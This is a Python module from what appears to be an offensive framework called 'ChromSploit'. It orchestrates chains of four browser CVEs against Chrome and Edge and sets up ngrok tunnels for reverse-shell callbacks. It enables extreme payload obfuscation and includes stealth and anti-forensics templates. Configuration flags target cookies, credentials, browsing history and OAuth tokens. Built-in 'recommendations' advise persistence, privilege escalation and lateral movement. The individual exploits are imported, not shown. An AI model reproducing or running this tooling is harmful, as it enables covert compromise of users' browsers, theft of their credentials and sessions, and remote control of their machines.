#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework - Browser Multi-Exploit Chain
Automated combination of all 4 browser CVEs for comprehensive exploitation
"""

import time
import threading
from typing import Dict, List, Any, Optional
from datetime import datetime
import logging

# ChromSploit imports
try:
    from core.enhanced_logger import get_logger
    from core.color_utils import Colors
    from core.exploit_chain import ExploitChain, get_chain_manager
    from modules.obfuscation.payload_obfuscator import PayloadObfuscator
    from modules.obfuscation.obfuscator import ObfuscationLevel, get_obfuscator
    from core.ngrok_manager import NgrokManager
    logger = get_logger()
    OBFUSCATION_AVAILABLE = True
    NGROK_AVAILABLE = True
except ImportError:
    logger = logging.getLogger(__name__)
    OBFUSCATION_AVAILABLE = False
    NGROK_AVAILABLE = False


class BrowserExploitChain:
    """Specialized exploit chain for browser CVE combinations"""
    
    # Available browser CVE exploits
    BROWSER_CVES = {
        'CVE-2025-4664': {
            'name': 'Chrome Link Header Referrer Policy',
            'browser': 'Chrome',
            'type': 'Data Leak / Reconnaissance',
            'severity': 'Medium',
            'description': 'Leaks browsing history and sensitive data'
        },
        'CVE-2025-2783': {
            'name': 'Chrome Mojo IPC Sandbox Escape',
            'browser': 'Chrome',
            'type': 'Sandbox Escape',
            'severity': 'High',
            'description': 'Escapes Chrome sandbox via IPC handle confusion'
        },
        'CVE-2025-30397': {
            'name': 'Edge WebAssembly JIT Type Confusion',
            'browser': 'Edge',
            'type': 'Memory Corruption',
            'severity': 'High',
            'description': 'JIT compiler type confusion for code execution'
        },
        'CVE-2025-2857': {
            'name': 'Chrome OAuth Exploitation',
            'browser': 'Chrome',
            'type': 'Authentication Bypass',
            'severity': 'Medium',
            'description': 'OAuth token manipulation and session hijacking'
        }
    }
    
    # Predefined exploit chains
    CHAIN_TEMPLATES = {
        'full_browser_compromise': {
            'name': 'Full Browser Compromise Chain',
            'description': 'Complete browser exploitation using all 4 CVEs',
            'steps': [
                # Step 1: Reconnaissance
                {
                    'cve': 'CVE-2025-4664',
                    'purpose': 'Initial reconnaissance and data gathering',
                    'config': {
                        'mode': 'full_scan',
                        'extract_cookies': True,
                        'extract_history': True,
                        'extract_credentials': True
                    }
                },
                # Step 2: OAuth exploitation for elevated access
                {
                    'cve': 'CVE-2025-2857',
                    'purpose': 'OAuth token theft and session hijacking',
                    'config': {
                        'steal_tokens': True,
                        'hijack_sessions': True,
                        'escalate_privileges': True
                    }
                },
                # Step 3: Edge exploitation (if available)
                {
                    'cve': 'CVE-2025-30397',
                    'purpose': 'Edge browser compromise via WebAssembly',
                    'config': {
                        'jit_iterations': 10000,
                        'heap_spray_count': 500,
                        'memory_corruption': True
                    }
                },
                # Step 4: Chrome sandbox escape
                {
                    'cve': 'CVE-2025-2783',
                    'purpose': 'Final sandbox escape for system access',
                    'config': {
                        'payload_type': 'reverse_shell',
                        'persistence': True,
                        'privilege_escalation': True
                    }
                }
            ]
        },
        
        'chrome_focused_attack': {
            'name': 'Chrome-Focused Attack Chain',
            'description': 'Chrome-specific exploitation chain',
            'steps': [
                {
                    'cve': 'CVE-2025-4664',
                    'purpose': 'Chrome reconnaissance',
                    'config': {'mode': 'chrome_specific'}
                },
                {
                    'cve': 'CVE-2025-2857',
                    'purpose': 'Chrome OAuth exploitation',
                    'config': {'target': 'google_oauth'}
                },
                {
                    'cve': 'CVE-2025-2783',
                    'purpose': 'Chrome sandbox escape',
                    'config': {'exploit_method': 'mojo_ipc'}
                }
            ]
        },
        
        'rapid_exploitation': {
            'name': 'Rapid Browser Exploitation',
            'description': 'Fast parallel exploitation of all browsers',
            'steps': [
                {
                    'cve': 'CVE-2025-4664',
                    'purpose': 'Quick recon',
                    'config': {'mode': 'fast', 'parallel': True}
                },
                {
                    'cve': 'CVE-2025-2783',
                    'purpose': 'Immediate sandbox escape',
                    'config': {'fast_mode': True, 'parallel': True}
                },
                {
                    'cve': 'CVE-2025-30397',
                    'purpose': 'Edge exploitation',
                    'config': {'quick_exploit': True, 'parallel': True}
                }
            ]
        },
        
        'stealth_browser_chain': {
            'name': 'Stealth Browser Exploitation',
            'description': 'Low-profile browser exploitation chain',
            'steps': [
                {
                    'cve': 'CVE-2025-4664',
                    'purpose': 'Silent reconnaissance',
                    'config': {'stealth': True, 'minimal_footprint': True}
                },
                {
                    'cve': 'CVE-2025-2857',
                    'purpose': 'Covert OAuth access',
                    'config': {'silent_mode': True, 'avoid_detection': True}
                },
                {
                    'cve': 'CVE-2025-2783',
                    'purpose': 'Quiet sandbox escape',
                    'config': {'stealth_payload': True, 'anti_forensics': True}
                }
            ]
        }
    }
    
    def __init__(self):
        self.chain_manager = get_chain_manager()
        self.active_chains: Dict[str, Any] = {}
        self.results: Dict[str, Any] = {}
        
        # Initialize obfuscation and ngrok if available
        self.payload_obfuscator = PayloadObfuscator() if OBFUSCATION_AVAILABLE else None
        self.ngrok_manager = NgrokManager() if NGROK_AVAILABLE else None
        self.obfuscation_enabled = True
        self.auto_ngrok_enabled = True
        self.obfuscation_level = ObfuscationLevel.EXTREME if OBFUSCATION_AVAILABLE else None
        
    def create_browser_chain(self, template_name: str = 'full_browser_compromise', 
                           custom_config: Dict[str, Any] = None) -> Optional[str]:
        """Create a new browser exploitation chain from template"""
        
        if template_name not in self.CHAIN_TEMPLATES:
            try:
                logger.error(f"{Colors.RED}[Browser Chain]{Colors.END} Unknown template: {template_name}")
            except:
                logger.error(f"Unknown template: {template_name}")
            return None
        
        template = self.CHAIN_TEMPLATES[template_name]
        
        # Create new exploit chain
        chain = self.chain_manager.create_chain(
            template['name'],
            template['description']
        )
        
        # Configure global parameters
        if custom_config:
            chain.set_global_parameter('callback_ip', custom_config.get('callback_ip', '127.0.0.1'))
            chain.set_global_parameter('callback_port', custom_config.get('callback_port', 4444))
            chain.set_global_parameter('target_url', custom_config.get('target_url', 'http://localhost'))
        
        # Setup Auto-Ngrok if enabled
        if self.auto_ngrok_enabled and self.ngrok_manager and custom_config:
            try:
                # Create ngrok tunnel for callback
                callback_port = custom_config.get('callback_port', 4444)
                tunnel_name = f"browser_chain_{chain.id[:8]}"
                
                tunnel = self.ngrok_manager.create_tunnel(
                    port=callback_port,
                    proto='tcp',
                    name=tunnel_name,
                    bind_tls='both'
                )
                
                if tunnel:
                    # Update callback URL with ngrok URL
                    public_url = tunnel.public_url.replace('tcp://', '')
                    chain.set_global_parameter('callback_ip', public_url.split(':')[0])
                    chain.set_global_parameter('callback_port', int(public_url.split(':')[1]))
                    chain.set_global_parameter('ngrok_tunnel', tunnel.public_url)
                    
                    try:
                        logger.info(f"{Colors.GREEN}[Ngrok]{Colors.END} Tunnel created: {tunnel.public_url}")
                    except:
                        logger.info(f"Ngrok tunnel created: {tunnel.public_url}")
            except Exception as e:
                logger.warning(f"Failed to create ngrok tunnel: {e}")
        
        # Configure obfuscation settings
        if self.obfuscation_enabled and self.payload_obfuscator:
            chain.set_global_parameter('obfuscation_enabled', True)
            chain.set_global_parameter('obfuscation_level', self.obfuscation_level.name)
            chain.set_global_parameter('payload_obfuscator', self.payload_obfuscator)
        
        # Add exploitation steps
        for step in template['steps']:
            # Merge configurations
            step_config = step['config'].copy()
            if custom_config:
                step_config.update(custom_config)
            
            # Get CVE info
            cve_info = self.BROWSER_CVES.get(step['cve'], {})
            
            # Add step to chain
            chain.add_step(
                cve_id=step['cve'],
                description=f"{step['purpose']} ({cve_info.get('name', 'Unknown')})",
                parameters=step_config,
                timeout=step_config.get('timeout', 300),
                retry_count=step_config.get('retry_count', 1),
                failure_action=step_config.get('failure_action', 'continue')
            )
        
        # Add progress callbacks
        chain.add_callback('before_step', self._on_before_step)
        chain.add_callback('after_step', self._on_after_step)
        chain.add_callback('on_success', self._on_step_success)
        chain.add_callback('on_failure', self._on_step_failure)
        
        # Store chain reference
        self.active_chains[chain.id] = {
            'chain': chain,
            'template': template_name,
            'created': datetime.now(),
            'config': custom_config or {}
        }
        
        try:
            logger.info(f"{Colors.GREEN}[Browser Chain]{Colors.END} Created '{template['name']}' (ID: {chain.id[:8]}...)")
        except:
            logger.info(f"Created '{template['name']}' (ID: {chain.id[:8]}...)")
        
        return chain.id
    
    def execute_browser_chain(self, chain_id: str, async_mode: bool = True) -> Dict[str, Any]:
        """Execute a browser exploitation chain"""
        
        if chain_id not in self.active_chains:
            return {
                'success': False,
                'error': 'Chain not found'
            }
        
        chain_info = self.active_chains[chain_id]
        chain = chain_info['chain']
        
        try:
            logger.info(f"{Colors.CYAN}[Browser Chain]{Colors.END} Starting execution of '{chain.name}'")
            logger.info(f"{Colors.YELLOW}[Browser Chain]{Colors.END} Template: {chain_info['template']}")
            logger.info(f"{Colors.YELLOW}[Browser Chain]{Colors.END} Steps: {len(chain.steps)}")
        except:
            logger.info(f"Starting execution of '{chain.name}'")
        
        # Execute the chain
        start_time = time.time()
        result = chain.execute(async_execution=async_mode)
        
        # Store results
        self.results[chain_id] = {
            'chain_result': result,
            'execution_time': time.time() - start_time,
            'timestamp': datetime.now()
        }
        
        # Create summary
        if not async_mode:
            return self._create_execution_summary(chain_id, result)
        else:
            return {
                'success': True,
                'chain_id': chain_id,
                'status': 'running',
                'message': 'Browser exploitation chain started in background'
            }
    
    def get_chain_status(self, chain_id: str) -> Dict[str, Any]:
        """Get current status of a browser chain"""
        
        if chain_id not in self.active_chains:
            return {'error': 'Chain not found'}
        
        chain = self.active_chains[chain_id]['chain']
        status = chain.get_status()
        
        # Add browser-specific information
        browser_status = {
            **status,
            'template': self.active_chains[chain_id]['template'],
            'browsers_targeted': self._get_targeted_browsers(chain),
            'exploitation_progress': self._calculate_exploitation_progress(chain)
        }
        
        return browser_status
    
    def stop_browser_chain(self, chain_id: str) -> bool:
        """Stop a running browser exploitation chain"""
        
        if chain_id not in self.active_chains:
            return False
        
        chain = self.active_chains[chain_id]['chain']
        chain.stop()
        
        try:
            logger.warning(f"{Colors.YELLOW}[Browser Chain]{Colors.END} Stopped chain: {chain_id[:8]}...")
        except:
            logger.warning(f"Stopped chain: {chain_id[:8]}...")
        
        return True
    
    def get_all_chains(self) -> List[Dict[str, Any]]:
        """Get information about all browser chains"""
        
        chains_info = []
        for chain_id, chain_data in self.active_chains.items():
            chain = chain_data['chain']
            chains_info.append({
                'id': chain_id,
                'name': chain.name,
                'template': chain_data['template'],
                'status': chain.status.value,
                'created': chain_data['created'].isoformat(),
                'steps': len(chain.steps),
                'browsers': self._get_targeted_browsers(chain)
            })
        
        return chains_info
    
    def _on_before_step(self, chain: ExploitChain, step):
        """Callback before step execution"""
        cve_info = self.BROWSER_CVES.get(step.cve_id, {})
        try:
            logger.info(f"{Colors.BLUE}[Browser Chain]{Colors.END} Executing: {cve_info.get('name', step.cve_id)}")
            logger.info(f"{Colors.BLUE}[Browser Chain]{Colors.END} Browser: {cve_info.get('browser', 'Unknown')}")
        except:
            logger.info(f"Executing: {cve_info.get('name', step.cve_id)}")
    
    def _on_after_step(self, chain: ExploitChain, step):
        """Callback after step execution"""
        execution_time = (step.end_time - step.start_time).total_seconds() if step.end_time and step.start_time else 0
        try:
            logger.info(f"{Colors.BLUE}[Browser Chain]{Colors.END} Step completed in {execution_time:.2f}s")
        except:
            logger.info(f"Step completed in {execution_time:.2f}s")
    
    def _on_step_success(self, chain: ExploitChain, step):
        """Callback on step success"""
        try:
            logger.info(f"{Colors.GREEN}[Browser Chain]{Colors.END} ✓ {step.cve_id} exploitation successful")
        except:
            logger.info(f"✓ {step.cve_id} exploitation successful")
    
    def _on_step_failure(self, chain: ExploitChain, step):
        """Callback on step failure"""
        try:
            logger.error(f"{Colors.RED}[Browser Chain]{Colors.END} ✗ {step.cve_id} exploitation failed: {step.error}")
        except:
            logger.error(f"✗ {step.cve_id} exploitation failed: {step.error}")
    
    def _get_targeted_browsers(self, chain: ExploitChain) -> List[str]:
        """Get list of browsers targeted by the chain"""
        browsers = set()
        for step in chain.steps:
            if step.cve_id in self.BROWSER_CVES:
                browsers.add(self.BROWSER_CVES[step.cve_id]['browser'])
        return list(browsers)
    
    def _calculate_exploitation_progress(self, chain: ExploitChain) -> Dict[str, Any]:
        """Calculate detailed exploitation progress"""
        total_steps = len(chain.steps)
        completed = sum(1 for step in chain.steps if step.status.value in ['success', 'failed', 'skipped'])
        successful = sum(1 for step in chain.steps if step.status.value == 'success')
        failed = sum(1 for step in chain.steps if step.status.value == 'failed')
        
        return {
            'percentage': (completed / total_steps * 100) if total_steps > 0 else 0,
            'completed_steps': completed,
            'successful_steps': successful,
            'failed_steps': failed,
            'total_steps': total_steps
        }
    
    def _create_execution_summary(self, chain_id: str, result) -> Dict[str, Any]:
        """Create comprehensive execution summary"""
        
        chain_info = self.active_chains[chain_id]
        chain = chain_info['chain']
        
        # Analyze results
        exploited_browsers = []
        successful_cves = []
        failed_cves = []
        
        for step in chain.steps:
            if step.status.value == 'success':
                successful_cves.append(step.cve_id)
                if step.cve_id in self.BROWSER_CVES:
                    exploited_browsers.append(self.BROWSER_CVES[step.cve_id]['browser'])
            elif step.status.value == 'failed':
                failed_cves.append(step.cve_id)
        
        # Create artifacts summary
        artifacts = {}
        for step in chain.steps:
            if step.result and isinstance(step.result, dict):
                if 'artifacts' in step.result:
                    artifacts[step.cve_id] = step.result['artifacts']
        
        summary = {
            'success': result.status.value == 'success',
            'chain_id': chain_id,
            'chain_name': chain.name,
            'template_used': chain_info['template'],
            'execution_time': result.execution_time,
            'status': result.status.value,
            'statistics': {
                'total_steps': result.total_steps,
                'successful_steps': result.successful_steps,
                'failed_steps': result.failed_steps,
                'skipped_steps': result.skipped_steps
            },
            'exploited_browsers': list(set(exploited_browsers)),
            'successful_cves': successful_cves,
            'failed_cves': failed_cves,
            'artifacts': artifacts,
            'recommendations': self._generate_recommendations(result, chain)
        }
        
        return summary
    
    def _generate_recommendations(self, result, chain) -> List[str]:
        """Generate post-exploitation recommendations"""
        
        recommendations = []
        
        # Check which exploits succeeded
        successful_cves = [step.cve_id for step in chain.steps if step.status.value == 'success']
        
        if 'CVE-2025-2783' in successful_cves:
            recommendations.append("Chrome sandbox escaped - establish persistence and escalate privileges")
        
        if 'CVE-2025-4664' in successful_cves:
            recommendations.append("Browser data leaked - analyze extracted credentials and history")
        
        if 'CVE-2025-30397' in successful_cves:
            recommendations.append("Edge compromised - expand to other Microsoft services")
        
        if 'CVE-2025-2857' in successful_cves:
            recommendations.append("OAuth tokens captured - use for lateral movement")
        
        if result.failed_steps > 0:
            recommendations.append("Some exploits failed - consider alternative attack vectors")
        
        if result.status.value == 'success':
            recommendations.append("Full chain successful - proceed with post-exploitation")
        
        return recommendations


# Quick access functions
def create_browser_attack_chain(template: str = 'full_browser_compromise', 
                               config: Dict[str, Any] = None) -> str:
    """Quick function to create a browser attack chain"""
    chain_module = BrowserExploitChain()
    return chain_module.create_browser_chain(template, config)


def execute_browser_attack(chain_id: str = None, template: str = 'full_browser_compromise',
                          config: Dict[str, Any] = None) -> Dict[str, Any]:
    """Quick function to create and execute a browser attack chain"""
    chain_module = BrowserExploitChain()
    
    # Create chain if not provided
    if not chain_id:
        chain_id = chain_module.create_browser_chain(template, config)
        if not chain_id:
            return {'success': False, 'error': 'Failed to create chain'}
    
    # Execute the chain
    return chain_module.execute_browser_chain(chain_id, async_mode=False)


def get_browser_chain_status(chain_id: str) -> Dict[str, Any]:
    """Get status of a browser exploitation chain"""
    chain_module = BrowserExploitChain()
    return chain_module.get_chain_status(chain_id)